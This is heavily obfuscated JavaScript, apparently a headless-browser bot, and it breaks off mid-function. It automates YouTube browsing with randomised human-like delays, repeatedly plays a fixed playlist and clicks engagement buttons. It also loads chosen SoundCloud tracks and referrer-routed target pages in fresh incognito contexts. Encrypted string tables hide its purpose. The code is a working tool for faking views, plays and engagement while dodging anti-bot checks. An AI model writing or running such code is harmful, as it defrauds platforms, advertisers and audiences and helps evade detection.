const a2 = b,
  a1 = d,
  a0 = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1 * 0x269f + -0x22a8 * -0x1 + 0x4 * 0xfe))) + i;
}
async function createPage(f, h) {
  const R = b;
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x6eb + 0x6 * -0x1ab + -0x7 * -0x71), await i['goto'](h, {
    'waitUntil': [R(0x5, 'zCCv') + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x610b + 0x1cf * -0x4c + -0x1f85 * -0x5 + (0x4c09 + 0x1c8 + -0x1339) * random()) : await standardWaitForNetIdle(f), await wait(-0x9ce + 0x331 * 0x2 + 0x1 * 0x16f4 + (-0x4661 + 0xc31 * -0x2 + -0x1 * -0x85d3) * random()), 0x35f * 0xb + 0x1ad7 + -0x3feb * 0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1 * 0x26cf + -0x2513 * 0x1 + -0x11cc * -0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x102d * 0x1 + -0x14c * -0x7 + 0x20 * -0xca;
}
async function randomWait() {
  return await wait(-0x2 * 0xb02 + -0xb * -0x6b + -0xc51 * -0x3 + (0x59f + 0x9eb + 0x3fe) * random()), 0x22ac + -0x1acd * 0x1 + -0x7de;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1c91 + -0x1d * 0xeb + -0x373 * -0x10);
    let h = e[f];
    if (b['HFtiBn'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1a37 + 0x1cf2 + -0x1b * 0x20b, s, t, u = -0x12 * -0xa3 + -0x22ce + 0x1758; t = n['charAt'](u++); ~t && (s = r % (0x22a8 + -0x546 * -0x1 + 0x1a * -0x189) ? s * (0x6eb + 0x6 * -0x1ab + -0x9 * -0x5f) + t : t, r++ % (0x102d + 0x73 * -0x33 + -0x6c * -0x10)) ? p += String['fromCharCode'](0x1959 + 0x98 + -0x18f2 & s >> (-(-0x9ce + 0x331 * 0x2 + 0x1 * 0x36e) * r & -0x2331 + 0xc31 * -0x1 + -0x2 * -0x17b4)) : 0x35f * 0xb + 0x1ad7 + -0xffb * 0x4) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1 * 0x26cf + -0x2513 * 0x1 + -0x1bc * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x102d * 0x1 + -0x14c * -0x7 + 0x1 * -0x1931))['slice'](-(-0x2 * 0xb02 + -0xb * -0x6b + -0x116d * -0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x59f + 0x9eb + -0xf8a,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x22ac + -0x1acd * 0x1 + -0x7df; u < 0x940 + 0xb29 + -0x1369; u++) {
          p[u] = u;
        }
        for (u = -0x1708 + 0x8c8 + 0xe40; u < -0x1d71 * 0x1 + -0xeb * 0x1 + 0xa74 * 0x3; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x24ad + -0x81e + 0x2dcb), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xe80 + -0x9cd + 0x184d, q = -0x3 * 0xb83 + 0x1 * 0x458 + 0x3b * 0x83;
        for (let v = -0x199e + -0x2c7 + 0x1c65 * 0x1; v < n['length']; v++) {
          u = (u + (-0x1 * -0x1eec + -0x37 * 0x2f + 0xd * -0x19a)) % (0x210b * -0x1 + 0x13fa + -0x115 * -0xd), q = (q + p[u]) % (0x3 * 0x139 + 0xc70 + -0xf1b), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x5 * -0x42d + -0x5 * -0x399 + -0x1 * 0x25de)]);
        }
        return t;
      };
      b['lgAcOU'] = m, c = arguments, b['HFtiBn'] = !![];
    }
    const j = e[0x1 * 0xe17 + 0x10b + -0xf22],
      k = f + j,
      l = c[k];
    return !l ? (b['plJpCe'] === undefined && (b['plJpCe'] = !![]), h = b['lgAcOU'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x940 + 0xb29 + -0x1469, -0x1708 + 0x8c8 + 0xe47), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x25f * 0x95 + -0xb00 * 0x1 + 0x256ab * 0x1) * getRandomInt(-0x24ad + -0x81e + 0x2ccd, -0xe80 + -0x9cd + 0x1852), h)), -0x3 * 0xb83 + 0x1 * 0x458 + 0x5 * 0x60a;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const S = d,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + S(0x10) + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x199e + -0x2c7 + 0x1c65 * 0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1 * -0x1eec + -0x37 * 0x2f + 0xd * -0x19a]['split']('\x20');
    for (let k = 0x210b * -0x1 + 0x13fa + -0xdf * -0xf; k < i['length']; k += 0x3 * 0x139 + 0xc70 + -0x1019)
      j += i[k] * h[i[k + (-0x5 * -0x42d + -0x5 * -0x399 + -0x1 * 0x26dd)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1 * 0xe17 + 0x10b + -0xf1c)['map'](l => Array['from'](l['children']))['flat'](0x6ad + -0xca * 0x22 + -0xac * -0x1e)['map'](l => l['childNodes'][0x175 * 0xd + 0x210e + -0x33fe]['childNodes'][0x19 * 0x189 + -0x1 * 0x1976 + -0xceb]['childNodes'][-0x2592 + -0x2ed * 0xa + 0x3 * 0x1647]['childNodes'][0x106 * -0xa + -0x1c23 * -0x1 + -0x1 * 0x11e7]['childNodes'][-0x12a5 + -0x2154 + 0x33fa]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x9 * 0x6d + -0xabc + 0x1279, -0x14e * -0x1d + 0x254d + 0xdb * -0x41)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x3992 + 0x6af0 + 0x49d * 0x2);
  const h = await getMaxTime(f),
    i = Math['min']((-0x8 * -0x32dd + 0xee6b + -0x19af3) * getRandomInt(-0x1 * 0x1e71 + 0x1 * 0xcfb + 0x8 * 0x22f, -0xe4d + 0x22ee + -0xa4e * 0x2), h);
  return await wait(i), 0x18f + -0xf * 0x28b + 0x143 * 0x1d;
}
async function frontScreenActions(f) {
  const T = c;
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x3d * -0x4f + -0x2c3 * -0x3 + -0x47 * -0x26]['children'][-0x445 * -0x8 + 0x560 * 0x3 + 0x1 * -0x3248]['children'][0x4 * -0x5d4 + 0x2 * -0xa47 + 0x2bde]['children'][0x2124 + 0xb13 * 0x2 + -0x374a]['children'][-0x104d + -0x4 * -0x201 + 0x3 * 0x2c3]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click'](T(0x2) + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x7fa + -0x1 * -0x855 + -0x104e * 0x1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x22f2 + -0x1f3a + 0x4290 + (-0xee0 + -0x1 * -0xf61 + 0x1 * -0x4f) * random()
  }), await wait(-0xf0c + 0x20d0 + -0xfd0 + (-0x23c2 + -0x9 * 0x70 + 0x2 * 0x146f) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1231 * 0x2 + -0x20c8 + -0x4 * 0xe6]['childNodes'][-0x1f6f + -0x2341 + -0x3f * -0x10f]['childNodes'][0x1b6 * -0xf + 0x1 * -0x1b6 + 0x2b * 0xa3]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x3 + 0x1410 * 0x1 + -0x140e]['childNodes'][0x22dd + -0x132c + -0x53b * 0x3]['childNodes'][0x24d + -0x2588 + 0x233d]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x165d + -0x73 * 0xd + 0x1c35),
          r = -0x99f + 0x1910 + 0x3b * -0x43;
        for (let u = -0xcbf + 0x16b3 + -0x9f4; u < q['length']; u += -0x127 + 0x2483 + -0x235a)
          r += q[u] * k[q[u + (-0x2d8 + -0x1b4a + 0x1e23)]];
        return r;
      }(n);
  });
  await wait((0x187f * 0x3 + 0x6701 + 0x2 * -0x3af3) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x92 * -0x123 + 0x6fd * 0x2e + 0x4ee0) * getRandomInt(-0x1f * 0x78 + -0x1 * -0x1297 + -0x40e, 0x187 + -0x9b * 0x19 + 0xda6), h + (0x1 * 0x736 + -0x144c + 0x1 * 0x209e));
  return await wait(i), 0x507 + 0xbe9 * 0x1 + -0x10ef;
}
async function keyWatch(f) {
  const U = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1818 + -0x1 * 0x26fb + -0xee3 * -0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + U(0x1)), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x97b * -0x2 + 0x1 * -0x16c7 + -0x29 * -0x61 + (-0x8e1 + -0x39 * -0x9d + 0x3 * -0x764) * Math['random']());
    });
  }, -0xad3 + -0x2d73 + 0x2 * 0x29cf);
  await wait(0x3a534 + -0x696e0 + -0x9d3 * -0xc4);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x2f17 + 0x8 * -0x8c9 + 0x10191) * getRandomInt(0x4 * 0x789 + -0x19c + -0x4 * 0x721, -0xb * 0x27d + -0x50f + 0x2087)), clearInterval(h), 0x1 * 0x541 + 0x1 * 0x1b83 + -0x20c3 * 0x1;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1c91 + -0x1d * 0xeb + -0x373 * -0x10);
    let h = e[f];
    if (c['kjIIhh'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1a37 + 0x1cf2 + -0x1b * 0x20b, r, s, t = -0x12 * -0xa3 + -0x22ce + 0x1758; s = m['charAt'](t++); ~s && (r = q % (0x22a8 + -0x546 * -0x1 + 0x1a * -0x189) ? r * (0x6eb + 0x6 * -0x1ab + -0x9 * -0x5f) + s : s, q++ % (0x102d + 0x73 * -0x33 + -0x6c * -0x10)) ? o += String['fromCharCode'](0x1959 + 0x98 + -0x18f2 & r >> (-(-0x9ce + 0x331 * 0x2 + 0x1 * 0x36e) * q & -0x2331 + 0xc31 * -0x1 + -0x2 * -0x17b4)) : 0x35f * 0xb + 0x1ad7 + -0xffb * 0x4) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1 * 0x26cf + -0x2513 * 0x1 + -0x1bc * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x102d * 0x1 + -0x14c * -0x7 + 0x1 * -0x1931))['slice'](-(-0x2 * 0xb02 + -0xb * -0x6b + -0x116d * -0x1));
        }
        return decodeURIComponent(p);
      };
      c['EBuRXO'] = i, b = arguments, c['kjIIhh'] = !![];
    }
    const j = e[0x59f + 0x9eb + -0xf8a],
      k = f + j,
      l = b[k];
    return !l ? (h = c['EBuRXO'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x619 + -0x1257 + 0x1870;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x2bf * 0xb + 0x8ec * -0x2 + -0x300e * -0x1;
    await randomWait();
  }
  return -0x6b * -0x7 + -0x1 * -0x6c3 + -0x25 * 0x43;
}

function fetchRandomSC() {
  const V = c;
  return Math['random']() <= 0x233f + -0xb5a + -0x17e5 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x3ec * 0x2 + 0xa4b * -0x1 + 0x1223 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + V(0x4) + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const X = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x19 * 0x137 + 0xff3 * -0x2 + 0x187 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1 * 0x446 + -0x2414 + 0xa9a * 0x3;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const W = d;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && W(0x11) === n['textConten' + 't'] && n['click']();
        });
        await wait(0x11c0 * 0x8 + 0x95 * -0x169 + 0xf3e5 + getRandomInt(0x2a42 + -0x4898 + 0x58ee, -0x1 * 0x7bcd + -0x345d * 0x2 + -0x1 * -0x159b7));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1 * -0x118c + 0x2 * -0xa57 + 0x323), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1 * 0x25ef + -0x61b * -0x6 + -0x4a91;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1a91 + -0x23c5 + 0x3e56, 0x1e47 + -0x1f1 * -0x5 + -0x27ca)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s[X(0x1c, 'O7CT')](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0xcca * -0x1 + 0x18 * -0xc + -0x3da + floor((0xa8 * -0x7 + 0x18 * -0x11c + 0x2320) * random()))), log('p2'), log(await s['evaluate'](() => {
        const Z = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x3f69d450 + 0xf46adcf6 * -0x1 + 0xe33c52 * 0x1eb),
          0x33c * 0x4e7d + 0x1 * -0x39c053 + 0x26b * -0x1c2b,
          -0xf0c4 + 0x99a7 * 0x1 + 0xd71d,
          -0xcec + 0x396 + 0x9d6
        ], y = [
          0x1905 + 0x1 * 0xafd + -0x23ea,
          0xca * 0x12 + 0x111f + -0x1f43,
          -0x235 * 0x1 + 0x362 * -0x1 + -0x1 * -0x59f,
          -0x1185 + -0xd8 + 0x125d
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x5c * -0x4d + 0xf * -0x5d + -0x1638)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x258c + -0x21cb * 0x1 + -0x3c1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0xc23 + -0x1daa * 0x1 + 0x1187) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0xc1 * -0x15 + -0x808 + -0x7cd] = A[0x1 * 0x2c5 + -0x8bb + 0x606] = A[0x12 * -0x10d + -0x1 * -0x17f + -0x1 * -0x116c] = A[-0x159 * -0x8 + 0x456 + -0xf1c] = A[0xc49 * 0x3 + -0xa59 + -0x7 * 0x3c9] = A[0xb03 + 0x20 * 0x137 + -0x31df] = A[0xfb * -0x7 + -0x2 * -0x8e1 + 0x20 * -0x57] = A[-0x1c9f + -0x24cf * -0x1 + 0x5 * -0x1a2] = A[-0x10b * -0x25 + -0x1d04 + -0x98c] = A[0x1c * -0xad + -0x152c + 0x2820] = A[-0x2b * 0xa + 0x596 + -0x3df] = A[-0x2362 + -0x1dcf * 0x1 + 0x413b] = A[0x27b * -0x5 + -0x6 * 0x512 + 0x2ade] = A[-0x12 * 0x166 + -0x1 * -0x32b + 0x160d * 0x1] = A[0x1337 * 0x2 + 0xa * -0xad + 0x5 * -0x653] = A[-0x1 * 0x1759 + 0x53b + 0x122c] = A[0x3ab * -0x2 + 0x17 * 0xd + 0x63a] = 0x11ab * 0x1 + 0x7a * 0x45 + -0x328d * 0x1, this['blocks'] = A) : this['blocks'] = [
                -0x5aa + -0x9 * 0x2d9 + -0x1 * -0x1f4b,
                -0x1698 + 0x849 + 0xe4f,
                0x240f + 0x2 * 0xa85 + 0x2f * -0x137,
                -0xa38 + 0x10 * -0x43 + -0x2 * -0x734,
                -0x1 * -0x7fa + 0x1548 + 0xe * -0x217,
                0x245b + 0xd22 + -0x317d,
                -0x23ba + 0x12e0 + -0x2cf * -0x6,
                0x1605 + -0x60a * -0x3 + -0x2823,
                0x3d * 0x7f + 0x2 * 0xbbf + -0x35c1,
                0x174 + 0x2417 + 0x258b * -0x1,
                -0xd3 * -0x3 + 0xdc + 0x355 * -0x1,
                -0x1a0a + 0x25 * 0xd9 + -0x553,
                0x257e + 0x1 * -0x2479 + 0x1d * -0x9,
                -0x9ff + 0x10f1 + -0x7 * 0xfe,
                0x2 * -0x829 + 0xd9a + 0x1d * 0x18,
                -0x1b05 + -0x252a + 0x402f,
                -0x4 * 0x683 + -0xaee + 0x24fa
              ], this['h0'] = -0x39 * -0x29c0d97 + -0x19f8635b + -0x13818043, this['h1'] = -0x1 * -0x10d8a7ef9 + -0x11eb21965 * 0x1 + 0xaf * 0x177e49b, this['h2'] = 0x130aa0dbf + 0xd4cd6e54 + -0x13 * 0x13325937, this['h3'] = 0x17043 * 0xd83 + 0x5efd1 * 0xeb + -0x8b0a9ae, this['h4'] = 0xf7ccc4d2 + -0x8751b4ab * 0x1 + -0x49 * -0x1244581, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x2046 + -0x2507 + 0x71 * 0x9d, this['finalized'] = this['hashed'] = 0x1 * 0x192b + 0x945 + 0x1 * -0x2270, this['first'] = 0x1e7e + -0x1d07 + -0x11 * 0x16;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x42b * 0x3 + 0xc73 + 0xe, O = J['length'] || -0xff6 + 0x1101 + 0x3 * -0x59, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x2 * 0x38c + 0x2647 + 0x1 * -0x2d5f, P[-0xbe3 * -0x1 + -0x13ef + -0x19c * -0x5] = this['block'], P[-0x1 * 0xdd + -0x247a + 0x2567] = P[0x8c7 + -0x106e + 0x1ea * 0x4] = P[0x13 * 0x7c + 0x143c + -0x2 * 0xeb7] = P[0xe17 + -0x6 * 0x26f + -0x86 * -0x1] = P[0x1b20 + 0x234a * 0x1 + -0x3e66] = P[-0x1edd * 0x1 + -0x1164 + 0x3046] = P[0xc56 + -0x352 + -0x8fe] = P[-0x1a4d + -0x1927 * -0x1 + 0x12d] = P[-0x1 * 0x1993 + 0x861 + 0x113a] = P[-0xa3 * 0xd + -0x503 * -0x2 + -0x1b6] = P[-0xa2b * -0x3 + 0xa * -0x3b5 + 0x69b] = P[-0x2638 + -0x1 * 0x1a96 + 0x40d9] = P[0xcd * 0x7 + -0x1478 + 0xee9] = P[-0x1 * -0x10fc + 0x7 * 0x46a + -0x2fd5] = P[0x1749 + 0x1 * 0x204f + 0x1bc5 * -0x2] = P[0x1 * 0x22db + -0x5 * -0x3a4 + 0x4 * -0xd40] = -0x8c + 0xedd * 0x2 + -0x1d2e), K) {
                    for (N = this['start']; M < O && N < -0x15ac + -0x17a4 + 0xc * 0x3cc; ++M)
                      P[N >> 0x4c * 0x5f + 0x303 + 0xa67 * -0x3] |= J[M] << y[-0x2678 + 0x35 * 0x8d + 0x94a & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1aff + -0x3 * 0xa01 + 0x3942 * 0x1; ++M)
                      (L = J['charCodeAt'](M)) < -0x240b * -0x1 + 0x1e32 + -0x41bd ? P[N >> 0x54b + 0x1 * 0x22e9 + -0x2832] |= L << y[-0x1f52 + -0x23ef * -0x1 + -0x1 * 0x49a & N++] : L < 0x14df + 0x1d9c + -0x2a7b ? (P[N >> 0x2543 + 0x1 * 0x11a9 + -0x42 * 0xd5] |= (0x17c2 + 0x19f + -0x18a1 | L >> 0x14db * 0x1 + -0x32d * 0xb + -0x2 * -0x70d) << y[-0x3 * 0xd03 + -0x8e2 * 0x2 + 0x1 * 0x38d0 & N++], P[N >> 0xaa6 + 0x1a78 + 0xfa * -0x26] |= (-0x1c * 0x7f + 0x1215 + -0x15 * 0x2d | 0x6d + -0x1b56 + 0x1b28 & L) << y[0x11 * -0x1d3 + -0x19 * -0x1 + 0x1eed & N++]) : L < -0x9dab + -0x1117 + 0x1 * 0x186c2 || L >= -0x1321d + 0xe3d5 + 0x12e48 ? (P[N >> 0xcbe + 0xc19 + -0x18d5] |= (0x15c7 + -0x1a20 + -0x1 * -0x539 | L >> -0x54d * 0x5 + -0xb * 0x2d7 + 0x39ca) << y[0x2197 + -0x20cb + -0x3 * 0x43 & N++], P[N >> 0x1 * -0x24e0 + 0x1c7 + -0x231b * -0x1] |= (0x1a90 + 0x564 + 0xf4 * -0x21 | L >> -0x1143 + -0x78e * 0x4 + -0x2f81 * -0x1 & -0x159a * -0x1 + -0x13d2 + -0x83 * 0x3) << y[0x23f0 + -0x2 * 0xa8e + -0x1 * 0xed1 & N++], P[N >> -0x20d7 + -0x835 * -0x2 + -0x1 * -0x106f] |= (-0x4c7 * -0x4 + 0xb * 0x2de + 0x1913 * -0x2 | 0x1752 + -0x1 * 0x1a6 + -0x156d & L) << y[0x1 * 0x56 + 0x1 * 0x250d + 0xd0 * -0x2e & N++]) : (L = 0x1a55e + -0x98cf * -0x3 + -0x26fcb * 0x1 + ((-0x1 * -0x23c8 + -0x104c + 0x1 * -0xf7d & L) << 0x1 * -0x1c09 + -0x1c55 + 0x3868 | 0x1e98 + 0x702 * 0x2 + 0x25 * -0x119 & J['charCodeAt'](++M)), P[N >> 0x163b + -0x2047 + 0x507 * 0x2] |= (-0xe49 + 0x80f + 0x72a | L >> -0x2137 + 0x13ed + -0x5f * -0x24) << y[-0x1e * -0xed + -0x3 * 0x4be + -0xd89 & N++], P[N >> -0x226 * -0x3 + 0x24e1 + -0x2b51] |= (0x65f + 0x1f63 + 0xfb * -0x26 | L >> -0x2 * 0x281 + 0x114 * -0xd + 0x1312 & 0xa5e * -0x3 + 0x1 * 0xcce + 0x128b) << y[0x4aa + -0x46 * 0x49 + 0xf4f & N++], P[N >> 0xbd4 + -0x1 * -0x1473 + -0x2045] |= (0x9cb + -0x156d + 0xc22 * 0x1 | L >> 0x17d + -0x138f + 0x1218 & -0x11 * 0x106 + 0x4 * 0x5de + -0x5d3) << y[0x1cba + 0x1af * -0x11 + -0x4 * 0x6 & N++], P[N >> -0x2008 + 0xee2 + 0x48 * 0x3d] |= (0x2496 + 0x27c * 0x2 + -0x1 * 0x290e | 0x6 * -0x2ef + 0x252d + -0x1354 & L) << y[-0x6d * -0x57 + -0x1634 + -0xed4 & N++]);
                  }
